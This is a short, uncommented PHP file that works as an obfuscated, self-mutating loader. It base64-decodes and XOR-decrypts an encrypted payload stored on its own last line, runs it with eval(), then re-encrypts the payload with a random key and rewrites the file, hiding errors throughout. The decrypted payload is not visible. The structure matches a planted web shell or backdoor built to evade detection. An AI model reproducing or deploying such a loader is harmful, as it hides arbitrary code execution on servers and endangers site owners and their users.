<?php
function bx($str) { $ec = @substr($str, 0, 64); $nh = @hash("sha256", NULL); $xor = ($ec^$nh); return $xor; }
function cx() { $x = @base64_decode(@implode(@array_slice(@file(__FILE__),-1))); $y = @dx($x, @bx($x)); @fx(@base64_encode(@ex($y, @hash("sha256", @mt_rand())))); @eval($y); die(); }
function dx($str, $key) { foreach(@str_split($str) as $k=>$v) $str[$k] = ($v^$key[$k%64]); return @substr($str, 0, 64) == @hash("sha256", NULL) ? @substr($str, 64, -1) : ""; }
function ex($str, $key) { foreach(@str_split(@hash("sha256", NULL).$str." ") as $k=>$v) $str[$k] = ($v^$key[$k%64]); return $str; }
function fx($n) { $l = @file(__FILE__); unset($l[sizeof($l) - 1]); $fh = @fopen(__FILE__, "w"); @fwrite($fh, @implode($l).$n); @fclose($fh); }
@cx();
?>
U1ADBldQUgUID1FSVAYIBgkHVlReBABeCwkFUlANBQBTBFcBUAFQUFVWCwRfBgFXVAcKUwELAlEBC1YEW11UAFMACVkURi5SXVtYETIKS15UR2xYGgtpRg==